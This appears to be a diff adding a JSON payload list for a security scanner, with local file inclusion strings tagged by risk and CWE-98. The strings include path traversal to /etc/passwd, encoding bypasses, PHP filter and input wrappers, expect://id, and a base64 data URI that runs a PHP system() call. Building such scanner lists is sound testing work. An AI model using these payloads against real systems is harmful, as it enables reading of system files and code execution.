@@ -1,0 +1,124 @@
+{
+  "lfi": [
+    {
+      "name": "Basic LFI",
+      "payload": "../../../etc/passwd",
+      "description": "Basic local file inclusion",
+      "risk": "high",
+      "cwe": "CWE-98",
+      "os": "unix"
+    },
+    {
+      "name": "Windows LFI",
+      "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "description": "Windows local file inclusion",
+      "risk": "high",
+      "cwe": "CWE-98",
+      "os": "windows"
+    },
+    {
+      "name": "Double Dot Bypass",
+      "payload": "....//....//....//etc/passwd",
+      "description": "Double dot bypass technique",
+      "risk": "high",
+      "cwe": "CWE-98",
+      "os": "unix"
+    },
+    {
+      "name": "URL Encoding Bypass",
+      "payload": "..%2F..%2F..%2Fetc%2Fpasswd",
+      "description": "URL encoding bypass",
+      "risk": "high",
+      "cwe": "CWE-98",
+      "os": "unix"
+    },
+    {
+      "name": "Double URL Encoding",
+      "payload": "..%252F..%252F..%252Fetc%252Fpasswd",
+      "description": "Double URL encoding bypass",
+      "risk": "high",
+      "cwe": "CWE-98",
+      "os": "unix"
+    },
+    {
+      "name": "PHP Wrapper",
+      "payload": "php://filter/convert.base64-encode/resource=/etc/passwd",
+      "description": "PHP wrapper for file inclusion",
+      "risk": "high",
+      "cwe": "CWE-98",
+      "os": "unix"
+    },
+    {
+      "name": "Data URI",
+      "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOz8+",
+      "description": "Data URI for code execution",
+      "risk": "critical",
+      "cwe": "CWE-98",
+      "os": "generic"
+    },
+    {
+      "name": "File Protocol",
+      "payload": "file:///etc/passwd",
+      "description": "File protocol wrapper",
+      "risk": "high",
+      "cwe": "CWE-98",
+      "os": "unix"
+    },
+    {
+      "name": "Null Byte Injection",
+      "payload": "../../../etc/passwd%00",
+      "description": "Null byte injection bypass",
+      "risk": "high",
+      "cwe": "CWE-98",
+      "os": "unix"
+    },
+    {
+      "name": "PHP Stream Wrapper",
+      "payload": "php://input",
+      "description": "PHP input stream wrapper",
+      "risk": "critical",
+      "cwe": "CWE-98",
+      "os": "generic"
+    },
+    {
+      "name": "ZIP Wrapper",
+      "payload": "zip://shell.jpg%23shell.php",
+      "description": "ZIP wrapper for file inclusion",
+      "risk": "high",
+      "cwe": "CWE-98",
+      "os": "generic"
+    },
+    {
+      "name": "Expect Wrapper",
+      "payload": "expect://id",
+      "description": "Expect wrapper for command execution",
+      "risk": "critical",
+      "cwe": "CWE-98",
+      "os": "unix"
+    },
+    {
+      "name": "Input Wrapper",
+      "payload": "php://input",
+      "description": "PHP input wrapper",
+      "risk": "critical",
+      "cwe": "CWE-98",
+      "os": "generic"
+    },
+    {
+      "name": "Filter Wrapper",
+      "payload": "php://filter/read=convert.base64-encode/resource=index.php",
+      "description": "PHP filter wrapper",
+      "risk": "high",
+      "cwe": "CWE-98",
+      "os": "generic"
+    },
+    {
+      "name": "Compression Wrapper",
+      "payload": "compress.zlib://file.txt",
+      "description": "Compression wrapper",
+      "risk": "medium",
+      "cwe": "CWE-98",
+      "os": "generic"
+    }
+  ]
+} 
